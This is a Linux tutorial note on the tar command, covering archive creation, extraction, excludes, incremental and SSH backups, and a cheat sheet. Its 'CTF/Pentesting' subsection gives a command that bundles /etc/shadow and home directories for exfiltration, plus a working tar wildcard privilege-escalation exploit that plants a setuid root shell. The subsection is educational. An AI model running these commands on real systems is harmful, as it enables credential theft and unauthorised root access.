# 🛠️ `tar` — Tape Archive | Linux Master Note

> **The universal packing tool of Linux. `tar` bundles files and directories into a single archive — the foundation of backups, deployments, and software distribution.**

---

## 📌 Table of Contents
1. [Introduction](#-introduction)
2. [Theory](#-theory--archiving-vs-compression)
3. [Syntax & Options](#-syntax--options)
4. [Basic Usage](#-basic-usage)
5. [Intermediate Usage](#-intermediate-usage)
6. [Advanced Usage](#-advanced-usage)
7. [Real World Pro Tips](#-real-world-pro-tips)
8. [Pros & Cons](#-pros--cons)
9. [Where & When to Use](#-where--when-to-use)
10. [Common Mistakes](#-common-mistakes)
11. [Practice Exercises](#-practice-exercises)
12. [Cheat Sheet](#-cheat-sheet)

---

## 🔰 Introduction

### What is `tar`?
`tar` (**T**ape **Ar**chive) combines multiple files into a single archive file. It can optionally compress using gzip, bzip2, or xz.

### Archive vs Compression:
| Concept | What it does | Tool |
|---------|-------------|------|
| **Archiving** | Bundle files into one | `tar` |
| **Compression** | Reduce file size | `gzip`, `bzip2`, `xz` |
| **Both** | Bundle + compress | `tar -czf` (tar + gzip) |

### Common extensions:
| Extension | Meaning |
|-----------|---------|
| `.tar` | Archive only (no compression) |
| `.tar.gz` / `.tgz` | tar + gzip |
| `.tar.bz2` / `.tbz2` | tar + bzip2 |
| `.tar.xz` / `.txz` | tar + xz |
| `.tar.zst` | tar + zstandard |

---

## 📖 Theory — Archiving vs Compression

### How tar works:
```
file1.txt  ─┐
file2.txt  ─┼── tar ──→ archive.tar (same size, one file)
dir/       ─┘              │
                          gzip
                           │
                      archive.tar.gz (compressed!)
```

### Compression comparison:
| Algorithm | Speed | Ratio | Extension | Flag |
|-----------|-------|-------|-----------|------|
| **gzip** | ⚡ Fast | Good | `.gz` | `-z` |
| **bzip2** | 🐢 Slow | Better | `.bz2` | `-j` |
| **xz** | 🐌 Slowest | **Best** | `.xz` | `-J` |
| **zstd** | ⚡⚡ Fastest | Great | `.zst` | `--zstd` |

> 🎯 Rule: **gzip** for daily use, **xz** for distribution, **zstd** for speed.

---

## 🧰 Syntax & Options

```bash
tar [OPERATION] [OPTIONS] [ARCHIVE] [FILES...]
```

### Operations (pick ONE):
| Flag | Description |
|------|-------------|
| `-c` | **Create** archive |
| `-x` | **Extract** archive |
| `-t` | **List** contents |
| `-r` | **Append** files to archive |
| `-u` | **Update** (add newer files) |

### Common options:
| Flag | Description |
|------|-------------|
| `-f FILE` | Archive **filename** (REQUIRED) |
| `-v` | **Verbose** (show files) |
| `-z` | Compress with **gzip** |
| `-j` | Compress with **bzip2** |
| `-J` | Compress with **xz** |
| `--zstd` | Compress with **zstandard** |
| `-C DIR` | Change to directory before action |
| `-p` | **Preserve** permissions |
| `--exclude=PATTERN` | Exclude files |
| `--exclude-from=FILE` | Exclude from file |
| `-k` | Don't overwrite existing files |
| `--strip-components=N` | Strip N leading directories |
| `-T FILE` | Read file list from FILE |
| `--newer=DATE` | Only files newer than DATE |
| `--totals` | Show total bytes |
| `-W` | Verify archive after writing |

---

## 🟢 Basic Usage

### Create archive
```bash
# Create tar (no compression)
$ tar -cvf archive.tar file1.txt file2.txt dir/

# Create with gzip compression (MOST COMMON)
$ tar -czvf archive.tar.gz file1.txt file2.txt dir/

# Create with bzip2
$ tar -cjvf archive.tar.bz2 dir/

# Create with xz (best compression)
$ tar -cJvf archive.tar.xz dir/
```

### Extract archive
```bash
# Extract tar.gz
$ tar -xzvf archive.tar.gz

# Extract to specific directory
$ tar -xzvf archive.tar.gz -C /opt/apps/

# Extract tar.bz2
$ tar -xjvf archive.tar.bz2

# Extract tar.xz
$ tar -xJvf archive.tar.xz

# Auto-detect compression (modern tar)
$ tar -xvf archive.tar.gz     # tar figures it out!
$ tar -xvf archive.tar.xz     # Works for any format
```

### List contents (without extracting)
```bash
$ tar -tzvf archive.tar.gz
-rw-r--r-- dipro/dipro  1234 2026-05-26 01:00 file1.txt
-rw-r--r-- dipro/dipro  5678 2026-05-26 01:00 file2.txt
drwxr-xr-x dipro/dipro     0 2026-05-26 01:00 dir/

# Just filenames
$ tar -tf archive.tar.gz
```

---

## 🟡 Intermediate Usage

### Extract specific files
```bash
# Extract single file from archive
$ tar -xzvf archive.tar.gz path/to/specific/file.txt

# Extract files matching pattern
$ tar -xzvf archive.tar.gz --wildcards "*.conf"
$ tar -xzvf archive.tar.gz --wildcards "etc/nginx/*"
```

### Exclude files/directories
```bash
# Exclude patterns
$ tar -czvf project.tar.gz project/ \
    --exclude='node_modules' \
    --exclude='.git' \
    --exclude='*.log' \
    --exclude='__pycache__'

# Exclude from file
$ cat exclude.txt
node_modules
.git
*.log
*.pyc
dist

$ tar -czvf project.tar.gz project/ --exclude-from=exclude.txt
```

### Append to existing archive
```bash
# Add files to tar (not compressed!)
$ tar -rvf archive.tar newfile.txt

# ⚠️ Can't append to compressed archives!
# Workaround: extract, add, recompress
```

### Preserve permissions & ownership
```bash
# Full backup preserving everything
$ sudo tar -cpzvf backup.tar.gz --acls --xattrs /etc/

# Restore with permissions
$ sudo tar -xpzvf backup.tar.gz -C /
```

### Strip directory levels
```bash
# Archive has: project-v1.0/src/main.py
# Extract without "project-v1.0/" prefix:
$ tar -xzvf project.tar.gz --strip-components=1
# Result: src/main.py (not project-v1.0/src/main.py)
```

### Differential/Incremental backup
```bash
# Full backup (saves snapshot)
$ tar -czvf full_backup.tar.gz -g snapshot.snar /var/www/

# Incremental (only changed files since full)
$ tar -czvf incr_backup_1.tar.gz -g snapshot.snar /var/www/

# Restore: apply full first, then incrementals in order
$ tar -xzvf full_backup.tar.gz -g /dev/null -C /
$ tar -xzvf incr_backup_1.tar.gz -g /dev/null -C /
```

---

## 🔴 Advanced Usage

### Backup Script
```bash
#!/bin/bash
# backup.sh — Automated system backup
DATE=$(date +%Y%m%d_%H%M%S)
BACKUP_DIR="/backup"
SOURCE="/var/www /etc /home"
EXCLUDE="--exclude='*.log' --exclude='*.tmp' --exclude='node_modules' --exclude='.git'"

mkdir -p "$BACKUP_DIR"

echo "Starting backup: $DATE"
tar -czvf "${BACKUP_DIR}/backup_${DATE}.tar.gz" \
    --exclude='*.log' --exclude='*.tmp' \
    --exclude='node_modules' --exclude='.git' \
    $SOURCE 2>/dev/null

# Remove backups older than 30 days
find "$BACKUP_DIR" -name "backup_*.tar.gz" -mtime +30 -delete

echo "Backup complete: ${BACKUP_DIR}/backup_${DATE}.tar.gz"
echo "Size: $(du -sh ${BACKUP_DIR}/backup_${DATE}.tar.gz | cut -f1)"
```

### Remote backup via SSH
```bash
# Backup and send to remote server
$ tar -czvf - /var/www/ | ssh user@backup-server "cat > /backups/web_$(date +%Y%m%d).tar.gz"

# Restore from remote
$ ssh user@backup-server "cat /backups/web_latest.tar.gz" | tar -xzvf - -C /

# Backup remote server to local
$ ssh user@server "tar -czvf - /var/www/" > remote_backup.tar.gz
```

### CTF/Pentesting — Tar Exploitation 🎯
```bash
# Extract and analyze a suspicious tar
$ tar -tzvf suspicious.tar.gz    # List first — NEVER extract blindly!
# Watch for:
# - Path traversal: ../../../etc/cron.d/backdoor
# - Absolute paths: /etc/shadow
# - Symlink attacks

# Safe extraction
$ mkdir -p /tmp/sandbox && cd /tmp/sandbox
$ tar -xzvf suspicious.tar.gz --no-same-owner --no-same-permissions

# Create tar for data exfiltration (on target)
$ tar -czf /tmp/.data.tar.gz /etc/shadow /etc/passwd /home/ 2>/dev/null

# Tar wildcard exploit (privilege escalation)
# If root runs: tar -cf backup.tar *  (in user-writable dir)
# Create these files:
$ echo "" > "--checkpoint=1"
$ echo "" > "--checkpoint-action=exec=sh shell.sh"
$ echo "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash" > shell.sh
# When tar runs with wildcard *, it treats filenames as flags!
```

### Pipe and stream
```bash
# Tar and pipe through network
$ tar -cf - /data | pv | nc remote-host 9999
# On remote: nc -l 9999 | tar -xf -

# Tar to stdout, compress, encrypt
$ tar -cf - /sensitive/ | gzip | openssl enc -aes-256-cbc -out backup.tar.gz.enc

# Clone directory structure (fast copy)
$ tar -cf - -C /source . | tar -xf - -C /destination
```

---

## 💡 Real World Pro Tips

### Tip 1: The magic flags to remember
```bash
# Create: -czvf (Create, gZip, Verbose, File)
# Extract: -xzvf (eXtract, gZip, Verbose, File)
# List:    -tzvf (lisT, gZip, Verbose, File)
```

### Tip 2: Modern tar auto-detects compression
```bash
# No need for -z/-j/-J when extracting!
$ tar -xvf anything.tar.gz     # Works!
$ tar -xvf anything.tar.xz     # Works!
$ tar -xvf anything.tar.bz2    # Works!
```

### Tip 3: Show progress for large archives
```bash
$ tar -czvf backup.tar.gz /data --totals
# Or with pv:
$ tar -cf - /data | pv | gzip > backup.tar.gz
```

### Tip 4: Never extract as root without checking!
```bash
# ALWAYS list first
$ tar -tf suspicious.tar.gz
# Look for path traversal (../../) before extracting
```

---

## ✅ Pros & Cons

| ✅ Pros | ❌ Cons |
|---------|---------|
| Universal on all Unix/Linux | Verbose syntax |
| Preserves permissions/ownership | Can't update compressed archives |
| Multiple compression options | No built-in encryption |
| Incremental backups | Path traversal vulnerabilities |
| Pipe-friendly (streaming) | No random file access |

---

## 📍 Where & When to Use

| Scenario | Command | Why |
|----------|---------|-----|
| Quick backup | `tar -czvf backup.tar.gz dir/` | Simple archiving |
| Software distribution | `tar -cJvf pkg.tar.xz dir/` | Best compression |
| Deploy code | `tar -xzvf app.tar.gz -C /opt/` | Preserves perms |
| Remote backup | `tar \| ssh` | Network streaming |
| Extract download | `tar -xvf file.tar.gz` | Auto-detect |
| Incremental backup | `tar -g snapshot.snar` | Changed files only |

---

## ⚠️ Common Mistakes

| Mistake | Fix |
|---------|-----|
| Forgetting `-f` flag | Always specify filename with `-f` |
| Extracting without listing first | `tar -tf` first! |
| Extracting as root blindly | Check for `../` path traversal |
| Can't append to .tar.gz | Only append to uncompressed .tar |
| Wrong flag order | `-f` must be LAST before filename |

---

## 📝 Practice Exercises

### 🟢 Beginner
1. Create a tar.gz of your home directory
2. List contents of a tar archive without extracting
3. Extract a tar.gz to a specific directory

### 🟡 Intermediate
4. Create archive excluding node_modules and .git
5. Extract a single file from an archive
6. Use `--strip-components` to flatten directory structure

### 🔴 Advanced
7. Write an automated backup script with rotation
8. Perform remote backup via SSH pipe
9. Understand and test the tar wildcard exploit

---

## 🧠 Cheat Sheet

```
CREATE:
  tar -czvf archive.tar.gz dir/       → gzip (fast)
  tar -cjvf archive.tar.bz2 dir/      → bzip2 (better)
  tar -cJvf archive.tar.xz dir/       → xz (best)

EXTRACT:
  tar -xvf archive.tar.gz             → Auto-detect
  tar -xvf archive.tar.gz -C /dest/   → To directory
  tar -xvf archive.tar.gz file.txt    → Single file

LIST:
  tar -tf archive.tar.gz              → List files
  tar -tzvf archive.tar.gz            → Detailed list

EXCLUDE:
  tar -czvf a.tar.gz dir/ --exclude='.git' --exclude='*.log'

INCREMENTAL:
  tar -czvf full.tar.gz -g snap.snar /data    → Full
  tar -czvf incr.tar.gz -g snap.snar /data    → Incremental

REMOTE:
  tar -czvf - /data | ssh user@host "cat > backup.tar.gz"

REMEMBER: c=Create x=eXtract t=lisT z=gZip v=Verbose f=File
```

---

> **Previous**: [`lscpu/lshw` ←](../08_system_info/55_lscpu_lshw.md) | **Next**: [`gzip/bzip2/xz` →](./57_gzip_bzip2_xz.md)

*📅 Last Updated: May 2026 | 🐧 Linux Master Tools by [Dipro Debnath](https://github.com/dipro20debnath)*
